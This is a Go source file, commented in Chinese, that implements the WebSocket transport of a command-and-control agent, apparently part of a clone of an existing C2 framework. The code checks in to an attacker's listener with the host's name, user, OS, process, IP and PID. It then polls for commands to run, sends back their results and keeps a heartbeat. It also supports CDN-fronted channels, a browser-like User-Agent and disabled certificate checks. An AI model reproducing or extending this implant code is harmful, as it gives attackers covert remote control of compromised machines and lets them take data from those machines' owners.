package main

// WebSocket 传输（对应服务端 c2engine/listener.go 的 /ws 与 /cdn/ws）。
//
// 协议（服务端 handleWebSocket 实读）：JSON 文本帧，字段名与 c2engine.WSMessage 一致。
//
//	→ {"type":"checkin","data":{...CheckinRequest...}}
//	← {"type":"checkin","client_id":N,"session_id":"...","status":"ok","data":{"interval":5,"timeout":30}}
//	→ {"type":"poll","client_id":N}
//	← {"type":"poll","data":{"tasks":[{"id":1,"command":"...","timeout":30}],"interval":5}}
//	→ {"type":"result","data":{"command_id":1,"result":"...","status":"completed"}}
//	→ {"type":"ping"}  ← {"type":"pong"}
//
// 这条通道的意义：原版支持 websocket（含 CDN 回源）模式，而复刻端此前只有服务端
// 侧实现、agent 侧完全没有 WS 客户端（docs/STATUS.md 的"互通矩阵"里 WS 一栏是 ❌）。
// 现在补上客户端，让 ws/cdn_websocket 监听器可被真实 agent 使用。

import (
	"crypto/tls"
	"encoding/json"
	"fmt"
	"net"
	"net/url"
	"runtime"
	"strings"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

// wsMessage 与服务端 WSMessage 对应。
type wsMessage struct {
	Type      string          `json:"type"`
	ClientID  int64           `json:"client_id,omitempty"`
	SessionID string          `json:"session_id,omitempty"`
	CommandID int64           `json:"command_id,omitempty"`
	Data      json.RawMessage `json:"data,omitempty"`
	Status    string          `json:"status,omitempty"`
	Message   string          `json:"message,omitempty"`
}

// wsTransport 是基于 WebSocket 的 agent 传输。
type wsTransport struct {
	serverURL string
	mu        sync.Mutex
	conn      *websocket.Conn
}

// newWSTransport 创建 WS 传输。addr 形如 "1.2.3.4:8443" 或 "1.2.3.4:8443/ws"。
// tls=true 时使用 wss（自签证书放行，与 HTTP/HTTPS 传输的处理一致）。
func newWSTransport(addr string, tls bool) *wsTransport {
	addr = strings.TrimRight(addr, "/")
	scheme := "ws"
	if tls {
		scheme = "wss"
	}
	if !strings.Contains(addr, "/") {
		addr += "/ws"
	}
	return &wsTransport{serverURL: scheme + "://" + addr}
}

// connect 建立连接（带 10 秒超时）。
func (t *wsTransport) connect() error {
	dialer := websocket.Dialer{
		HandshakeTimeout: 10 * time.Second,
		NetDial: func(network, addr string) (net.Conn, error) {
			return net.DialTimeout(network, addr, 10*time.Second)
		},
		TLSClientConfig: wsTLSConfig(),
	}
	u, err := url.Parse(t.serverURL)
	if err != nil {
		return err
	}
	if u.Scheme == "wss" {
		dialer.TLSClientConfig = wsTLSConfig()
	}
	conn, _, err := dialer.Dial(u.String(), map[string][]string{
		// 部分 CDN 需要 Host 头与源站一致；这里保持默认（URL 的 host）。
		"User-Agent": {"Mozilla/5.0"},
	})
	if err != nil {
		return err
	}
	t.conn = conn
	return nil
}

// ensure 确保连接可用。
func (t *wsTransport) ensure() error {
	if t.conn != nil {
		return nil
	}
	return t.connect()
}

// roundTrip 发送一条消息并读取指定类型的响应（跳过 pong / 心跳）。
func (t *wsTransport) roundTrip(msg wsMessage, want string) (*wsMessage, error) {
	if err := t.ensure(); err != nil {
		return nil, err
	}
	t.conn.SetWriteDeadline(time.Now().Add(15 * time.Second))
	if err := t.conn.WriteJSON(msg); err != nil {
		t.conn.Close()
		t.conn = nil
		return nil, err
	}
	deadline := time.Now().Add(30 * time.Second)
	for {
		if time.Now().After(deadline) {
			return nil, fmt.Errorf("ws: timeout waiting for %q", want)
		}
		t.conn.SetReadDeadline(time.Now().Add(30 * time.Second))
		var resp wsMessage
		if err := t.conn.ReadJSON(&resp); err != nil {
			t.conn.Close()
			t.conn = nil
			return nil, err
		}
		switch resp.Type {
		case "pong":
			continue
		case "error":
			return nil, fmt.Errorf("ws: server error: %s", resp.Message)
		case want:
			return &resp, nil
		default:
			// 未知/无关消息：忽略，继续等目标类型。
			continue
		}
	}
}

// Checkin 执行签到。
func (t *wsTransport) Checkin() (*CheckinResponse, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	payload, _ := json.Marshal(CheckinRequest{
		VerifyKey:   VerifyKey,
		HostName:    hostname,
		UserName:    username,
		OsName:      runtime.GOOS,
		ProcessName: processName,
		LocalIP:     localIP,
		Arch:        runtime.GOARCH,
		PID:         pid,
		Version:     agentVersion,
	})
	resp, err := t.roundTrip(wsMessage{Type: "checkin", Data: payload}, "checkin")
	if err != nil {
		return nil, err
	}
	cr := &CheckinResponse{ClientID: resp.ClientID, SessionID: resp.SessionID, Status: resp.Status}
	if len(resp.Data) > 0 {
		var meta struct {
			Interval int `json:"interval"`
			Timeout  int `json:"timeout"`
		}
		if json.Unmarshal(resp.Data, &meta) == nil {
			cr.Interval = meta.Interval
			cr.Timeout = meta.Timeout
		}
	}
	if cr.ClientID > 0 {
		clientID = cr.ClientID
		sessionID = cr.SessionID
	}
	if cr.Interval > 0 {
		sleepTime = cr.Interval
	}
	return cr, nil
}

// GetTasks 轮询待处理任务。
func (t *wsTransport) GetTasks() ([]TaskItem, error) {
	t.mu.Lock()
	defer t.mu.Unlock()

	resp, err := t.roundTrip(wsMessage{Type: "poll", ClientID: clientID}, "poll")
	if err != nil {
		return nil, err
	}
	var tr TaskResponse
	if len(resp.Data) > 0 {
		if err := json.Unmarshal(resp.Data, &tr); err != nil {
			return nil, err
		}
	}
	if tr.Interval > 0 {
		sleepTime = tr.Interval
	}
	return tr.Tasks, nil
}

// SendResult 回传任务结果。
func (t *wsTransport) SendResult(taskID int64, result, status string) error {
	t.mu.Lock()
	defer t.mu.Unlock()

	payload, _ := json.Marshal(map[string]interface{}{
		"command_id": taskID,
		"result":     result,
		"status":     status,
	})
	_, err := t.roundTrip(wsMessage{Type: "result", ClientID: clientID, Data: payload}, "result")
	return err
}

// Close 关闭连接。
func (t *wsTransport) Close() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	if t.conn != nil {
		t.conn.Close()
		t.conn = nil
	}
	return nil
}

// Ping 发送一次心跳（服务端回 pong）。
func (t *wsTransport) Ping() error {
	t.mu.Lock()
	defer t.mu.Unlock()
	_, err := t.roundTrip(wsMessage{Type: "ping"}, "pong")
	return err
}

// wsTLSConfig 是 WS/WSS 客户端 TLS 配置。
//
// C2 监听器普遍使用自签证书（服务端 loadOrGenerateTLS 就是自签），agent 无法
// 预置 CA，因此跳过校验——这与 HTTP/HTTPS 传输的既有取舍一致。
func wsTLSConfig() *tls.Config {
	return &tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS12}
}
